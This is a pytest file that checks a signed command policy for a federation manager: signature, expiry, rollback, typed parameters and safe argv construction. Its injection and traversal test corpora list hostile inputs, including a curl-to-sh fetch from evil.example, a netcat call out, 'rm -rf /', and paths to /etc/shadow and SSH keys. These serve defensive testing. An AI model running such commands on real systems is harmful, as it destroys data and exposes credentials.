"""Operations policy verification, typed parameters, and argv construction.

Covers gates G03 (no arbitrary shell), G04 (operation accounting), G05 (policy
signature), G06 (typed parameters) and the parameter half of G19 (no command
injection).
"""
from __future__ import annotations

import base64
import copy
import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

pytest.importorskip("cryptography")

from server.backend.federation_manager_operations import (  # noqa: E402
    ExecutionContext,
    OperationDisabledError,
    OperationPolicyError,
    ParameterValidationError,
    PathContainmentError,
    PolicySignatureError,
    accounting_summary,
    build_argv,
    canonical_json,
    load_policy_document,
    resolve_within,
    sha256_hex,
    validate_parameters,
    verify_policy,
)

POLICY_PATH = REPO_ROOT / "config" / "operations_policy.json"
PUBLIC_KEY_PATH = REPO_ROOT / "config" / "operations_policy_key.pub"
SCHEMA_PATH = REPO_ROOT / "schemas" / "signed_command_policy.schema.json"

PINNED_KEY_ID = "prii-operations-test-2026-07"
NOW = datetime(2026, 7, 27, 12, 0, 0, tzinfo=timezone.utc)


@pytest.fixture(scope="module")
def schema():
    return json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))


@pytest.fixture(scope="module")
def public_key():
    return PUBLIC_KEY_PATH.read_bytes()


@pytest.fixture
def document():
    return load_policy_document(POLICY_PATH)


@pytest.fixture
def policy(document, schema, public_key):
    return verify_policy(
        document,
        schema=schema,
        public_key_pem=public_key,
        pinned_key_id=PINNED_KEY_ID,
        now=NOW,
    )


@pytest.fixture
def context(tmp_path):
    app_root = tmp_path / "app"
    data_root = tmp_path / "data"
    staging = tmp_path / "staging"
    for path in (app_root, data_root, staging):
        path.mkdir(parents=True)
    return ExecutionContext(app_root=app_root, data_root=data_root, staging_root=staging)


def _resign(body, key_id=PINNED_KEY_ID):
    """Re-sign a mutated policy body with the fixture key.

    Lets a test isolate one property (expiry, sequence) without the signature
    failing first and masking what is actually under test.
    """
    from tools.build_operations_policy import test_signing_key

    payload = canonical_json(body)
    return {
        "policy": body,
        "signature": {
            "key_id": key_id,
            "algorithm": "Ed25519",
            "value": base64.b64encode(test_signing_key().sign(payload)).decode("ascii"),
            "payload_sha256": sha256_hex(payload),
        },
    }


# ── G04: accounting ─────────────────────────────────────────────────────────


def test_all_68_operations_are_accounted_with_zero_unclassified(document):
    summary = accounting_summary(document)
    assert summary["total"] == 68
    assert summary["enabled"] == 12
    assert summary["declared_not_enabled"] == 56
    assert summary["unclassified"] == []
    assert summary["by_app"]["thehub"] == 13
    assert sum(v for k, v in summary["by_app"].items() if k != "thehub") == 55


def test_every_deferred_operation_states_a_reason(policy):
    missing = [
        op.operation_id
        for op in policy.operations.values()
        if not op.enabled and not op.enablement_reason.strip()
    ]
    assert missing == []


def test_only_hub_operations_are_enabled(policy):
    enabled = sorted(op.operation_id for op in policy.operations.values() if op.enabled)
    assert all(op.startswith("hub.") for op in enabled)
    assert "hub.fetch" not in enabled, "R3 acquisition must stay disabled in this vector"
    assert len(enabled) == 12


# ── G05: signature, pinned key, expiry, anti-rollback ───────────────────────


def test_valid_policy_verifies(policy):
    assert policy.policy_id == "prii-federation-ui-only-operations"
    assert policy.sequence >= 1
    assert policy.payload_sha256


def test_tampered_operation_fails_signature(document, schema, public_key):
    tampered = copy.deepcopy(document)
    tampered["policy"]["operations"][0]["enablement"] = "ENABLED"
    with pytest.raises(PolicySignatureError):
        verify_policy(
            tampered, schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
        )


def test_tampered_digest_alone_fails(document, schema, public_key):
    tampered = copy.deepcopy(document)
    tampered["signature"]["payload_sha256"] = "0" * 64
    with pytest.raises(PolicySignatureError, match="digest"):
        verify_policy(
            tampered, schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
        )


def test_unpinned_key_is_rejected(document, schema, public_key):
    with pytest.raises(PolicySignatureError, match="pinned key"):
        verify_policy(
            document,
            schema=schema,
            public_key_pem=public_key,
            pinned_key_id="some-other-key",
            now=NOW,
        )


def test_signature_from_a_different_key_is_rejected(document, schema):
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    attacker = Ed25519PrivateKey.generate()
    attacker_public = attacker.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    with pytest.raises(PolicySignatureError, match="verification failed"):
        verify_policy(
            document,
            schema=schema,
            public_key_pem=attacker_public,
            pinned_key_id=PINNED_KEY_ID,
            now=NOW,
        )


def test_expired_policy_is_rejected(document, schema, public_key):
    body = copy.deepcopy(document["policy"])
    body["expires_at"] = "2026-07-01T00:00:00Z"
    with pytest.raises(PolicySignatureError, match="expired"):
        verify_policy(
            _resign(body), schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
        )


def test_rollback_to_an_older_sequence_is_rejected(document, schema, public_key):
    body = copy.deepcopy(document["policy"])
    body["sequence"] = 3
    body["minimum_accepted_sequence"] = 3
    verify_policy(
        _resign(body), schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
    )

    older = copy.deepcopy(document["policy"])
    older["sequence"] = 2
    with pytest.raises(PolicySignatureError, match="rollback"):
        verify_policy(
            _resign(older),
            schema=schema,
            public_key_pem=public_key,
            pinned_key_id=PINNED_KEY_ID,
            minimum_sequence=3,
            now=NOW,
        )


def test_issuer_floor_also_blocks_rollback(document, schema, public_key):
    body = copy.deepcopy(document["policy"])
    body["sequence"] = 1
    body["minimum_accepted_sequence"] = 5
    with pytest.raises(PolicySignatureError, match="rollback"):
        verify_policy(
            _resign(body), schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
        )


def test_policy_not_yet_valid_is_rejected(document, schema, public_key):
    body = copy.deepcopy(document["policy"])
    future = (NOW + timedelta(days=30)).isoformat().replace("+00:00", "Z")
    body["issued_at"] = future
    body["expires_at"] = (NOW + timedelta(days=60)).isoformat().replace("+00:00", "Z")
    with pytest.raises(PolicySignatureError, match="not yet valid"):
        verify_policy(
            _resign(body), schema=schema, public_key_pem=public_key, pinned_key_id=PINNED_KEY_ID, now=NOW
        )


# ── G03: nothing shell-shaped anywhere in the executable surface ────────────


def test_no_operation_declares_a_shell_target(policy):
    for operation in policy.operations.values():
        assert operation.target.kind in {
            "internal_builtin",
            "console_script",
            "python_module",
            "python_script",
            "make_target",
            "composite_unresolved",
        }
        assert operation.target.identifier not in {"sh", "bash", "zsh", "cmd", "powershell"}


def test_argv_elements_are_literals_or_parameter_references(policy):
    for operation in policy.operations.values():
        for element in operation.argv:
            assert set(element) <= {"literal", "param"}
            assert len(element) == 1


def test_enabled_operations_are_never_composite(policy):
    for operation in policy.operations.values():
        if operation.enabled:
            assert operation.target.kind != "composite_unresolved"


def test_composite_targets_cannot_produce_argv(policy, context):
    composite = next(
        op for op in policy.operations.values() if op.target.kind == "composite_unresolved"
    )
    object.__setattr__(composite, "enablement", "ENABLED")
    with pytest.raises(OperationPolicyError, match="composite"):
        build_argv(composite, {}, context)


def test_disabled_operation_cannot_be_required_or_built(policy, context):
    with pytest.raises(OperationDisabledError):
        policy.require("hub.fetch")
    with pytest.raises(OperationDisabledError):
        build_argv(policy.operations["hub.fetch"], {}, context)


# ── G06: typed parameters ───────────────────────────────────────────────────


def test_required_parameter_is_enforced(policy):
    operation = policy.require("hub.validate_package")
    with pytest.raises(ParameterValidationError, match="required"):
        validate_parameters(operation, {})


def test_unknown_parameter_is_rejected_not_ignored(policy):
    operation = policy.require("hub.list")
    with pytest.raises(ParameterValidationError, match="unknown"):
        validate_parameters(operation, {"registry": "registry/producers.yaml", "extra": "x"})


def test_fixed_parameter_cannot_be_overridden(policy):
    operation = policy.require("hub.graph_report")
    with pytest.raises(ParameterValidationError, match="fixed"):
        validate_parameters(operation, {"in_dir": "data/aggregate", "json": False})


def test_enum_rejects_a_value_outside_the_declared_set(policy):
    operation = policy.require("hub.wrap_bridge")
    with pytest.raises(ParameterValidationError, match="must be one of"):
        validate_parameters(operation, {"path": "pkg", "producer": "attacker-pr"})


def test_numeric_bounds_are_enforced(policy):
    operation = policy.require("hub.correlate")
    with pytest.raises(ParameterValidationError, match=">="):
        validate_parameters(
            operation, {"in_dir": "a", "out": "b", "window_days": -1}
        )
    with pytest.raises(ParameterValidationError, match="<="):
        validate_parameters(
            operation, {"in_dir": "a", "out": "b", "threshold_km": 99999}
        )


def test_type_confusion_is_rejected(policy):
    operation = policy.require("hub.correlate")
    with pytest.raises(ParameterValidationError, match="integer"):
        validate_parameters(operation, {"in_dir": "a", "out": "b", "window_days": "7"})
    with pytest.raises(ParameterValidationError, match="integer"):
        # bool is an int subclass in Python; the validator must not let that through
        validate_parameters(operation, {"in_dir": "a", "out": "b", "window_days": True})


def test_datetime_requires_a_timezone(policy):
    operation = policy.require("hub.wrap_bridge")
    with pytest.raises(ParameterValidationError, match="timezone"):
        validate_parameters(
            operation,
            {"path": "pkg", "producer": "ovnis-pr", "created_at": "2026-07-27T00:00:00"},
        )


def test_extension_constraint_is_enforced(policy):
    operation = policy.require("hub.consume_sensor_fusion")
    with pytest.raises(ParameterValidationError, match="must end with"):
        validate_parameters(operation, {"path": "fusion.exe"})


# ── G19: adversarial parameter corpus ───────────────────────────────────────

INJECTION_CORPUS = [
    "; rm -rf /",
    "&& curl http://evil.example/x | sh",
    "| nc evil.example 1234",
    "`whoami`",
    "$(id)",
    "\n/etc/passwd",
    "\r\nmalicious",
    "a\x00b",
    "--out=/etc/shadow",
    "$IFS$9",
    "'; DROP TABLE entities; --",
    "\\\\evil\\share",
]

TRAVERSAL_CORPUS = [
    "../../../../etc/passwd",
    "..",
    "a/../../b",
    "/etc/passwd",
    "/",
    "C:\\Windows\\System32",
    "\\\\?\\C:\\Windows",
    "data/../../../root/.ssh/id_rsa",
]


@pytest.mark.parametrize("payload", INJECTION_CORPUS)
def test_injection_payloads_never_reach_argv_as_code(policy, context, payload):
    """Metacharacters are either rejected or carried as one inert argv element.

    Both outcomes are safe. Since argv is a list handed to a shell-free Popen,
    a semicolon is just a character in a filename -- what must never happen is a
    payload becoming a *separate* argv element or a second command.
    """
    operation = policy.require("hub.wrap_bridge")
    try:
        params = validate_parameters(
            operation, {"path": payload, "producer": "ovnis-pr", "mode": "test"}
        )
        built = build_argv(operation, params, context)
    except (ParameterValidationError, PathContainmentError):
        return  # rejected outright, which is the stronger outcome

    for element in built.argv:
        assert element.count(payload) <= 1
    joined = "\x00".join(built.argv)
    assert joined.count(payload) <= 1
    assert built.argv[0] == "hub"


@pytest.mark.parametrize("payload", TRAVERSAL_CORPUS)
def test_traversal_payloads_are_rejected(policy, context, payload):
    operation = policy.require("hub.validate_package")
    with pytest.raises((ParameterValidationError, PathContainmentError)):
        params = validate_parameters(operation, {"path": payload})
        build_argv(operation, params, context)


def test_resolve_within_rejects_symlink_escape(tmp_path):
    root = tmp_path / "managed"
    outside = tmp_path / "outside"
    root.mkdir()
    outside.mkdir()
    (outside / "secret.txt").write_text("x", encoding="utf-8")
    (root / "link").symlink_to(outside)

    with pytest.raises(PathContainmentError, match="escapes"):
        resolve_within(root, "link/secret.txt")


def test_resolve_within_accepts_a_contained_path(tmp_path):
    root = tmp_path / "managed"
    (root / "nested").mkdir(parents=True)
    (root / "nested" / "ok.json").write_text("{}", encoding="utf-8")
    assert resolve_within(root, "nested/ok.json") == (root / "nested" / "ok.json").resolve()


# ── argv construction ───────────────────────────────────────────────────────


def test_hub_list_builds_the_expected_argv(policy, context):
    operation = policy.require("hub.list")
    params = validate_parameters(operation, {})
    built = build_argv(operation, params, context)
    assert built.argv == ("hub", "list", "--registry", "registry/producers.yaml")
    assert built.cwd == context.app_root


def test_fixed_boolean_flag_is_emitted_without_a_value(policy, context):
    operation = policy.require("hub.graph_report")
    (context.data_root / "aggregate").mkdir()
    params = validate_parameters(operation, {"in_dir": "aggregate"})
    built = build_argv(operation, params, context)
    assert built.argv[0:2] == ("hub", "graph-report")
    assert "--json" in built.argv
    assert "True" not in built.argv and "true" not in built.argv


def test_false_boolean_drops_its_flag(policy, context):
    operation = policy.require("hub.aggregate")
    (context.data_root / "ws").mkdir()
    params = validate_parameters(operation, {"root": "ws", "non_strict": False})
    built = build_argv(operation, params, context)
    assert "--non-strict" not in built.argv


def test_true_boolean_keeps_its_flag(policy, context):
    operation = policy.require("hub.aggregate")
    (context.data_root / "ws").mkdir()
    params = validate_parameters(operation, {"root": "ws", "non_strict": True})
    built = build_argv(operation, params, context)
    assert "--non-strict" in built.argv


def test_managed_paths_are_absolute_and_contained(policy, context):
    operation = policy.require("hub.correlate")
    (context.data_root / "agg").mkdir()
    params = validate_parameters(operation, {"in_dir": "agg", "out": "correlations"})
    built = build_argv(operation, params, context)
    in_path = built.resolved_paths["in_dir"]
    out_path = built.resolved_paths["out"]
    assert in_path.is_absolute() and out_path.is_absolute()
    assert str(in_path).startswith(str(context.data_root.resolve()))
    assert str(out_path).startswith(str(context.staging_root.resolve()))


def test_file_token_requires_a_staged_path(policy, context):
    operation = policy.require("hub.validate_manifest")
    params = validate_parameters(operation, {"path": "manifest.json"})
    with pytest.raises(ParameterValidationError, match="staged path"):
        build_argv(operation, params, context)


def test_file_token_uses_only_the_staged_path(policy, context):
    operation = policy.require("hub.validate_manifest")
    staged = context.staging_root / "intake" / "manifest.json"
    staged.parent.mkdir(parents=True)
    staged.write_text("{}", encoding="utf-8")
    params = validate_parameters(operation, {"path": "manifest.json"})
    built = build_argv(operation, params, context, token_paths={"path": staged})
    assert built.argv == ("hub", "validate-manifest", str(staged.resolve()))


def test_staged_path_outside_managed_roots_is_refused(policy, context, tmp_path):
    operation = policy.require("hub.validate_manifest")
    rogue = tmp_path / "elsewhere" / "manifest.json"
    rogue.parent.mkdir(parents=True)
    rogue.write_text("{}", encoding="utf-8")
    params = validate_parameters(operation, {"path": "manifest.json"})
    with pytest.raises(PathContainmentError, match="outside every managed root"):
        build_argv(operation, params, context, token_paths={"path": rogue})


def test_argv_hash_is_stable_and_order_sensitive(policy, context):
    operation = policy.require("hub.list")
    params = validate_parameters(operation, {})
    first = build_argv(operation, params, context)
    second = build_argv(operation, params, context)
    assert first.argv_sha256 == second.argv_sha256
    assert len(first.argv_sha256) == 64


def test_argv_builder_never_reads_the_declared_source_text(policy, context):
    """Provenance is audit data; it must not influence what runs."""
    operation = policy.require("hub.list")
    object.__setattr__(
        operation, "provenance", {"source": "x", "declared_source_text": "rm -rf / ; evil"}
    )
    built = build_argv(operation, validate_parameters(operation, {}), context)
    assert "evil" not in " ".join(built.argv)
    assert built.argv[0] == "hub"


def test_every_enabled_operation_builds_argv_from_defaults(policy, context):
    """Smoke: no enabled operation is missing a parameter the argv references."""
    for directory in ("ws", "agg", "pkg"):
        (context.data_root / directory).mkdir(exist_ok=True)
    staged = context.staging_root / "in.json"
    staged.write_text("{}", encoding="utf-8")

    required_stub = {
        "root": "ws",
        "in_dir": "agg",
        "out": "out",
        "path": "pkg",
        "producer": "ovnis-pr",
    }
    for operation in policy.operations.values():
        if not operation.enabled:
            continue
        supplied = {
            name: required_stub[name]
            for name, spec in operation.parameters.items()
            if spec.get("required") and name in required_stub
        }
        tokens = {
            name: staged
            for name, spec in operation.parameters.items()
            if spec["type"] in {"file_token", "file_set_token"}
        }
        if "path" in tokens:
            supplied["path"] = "in.json"
        params = validate_parameters(operation, supplied)
        built = build_argv(operation, params, context, token_paths=tokens)
        assert built.argv[0] == "hub"
        assert built.argv[1] == operation.target.subcommand
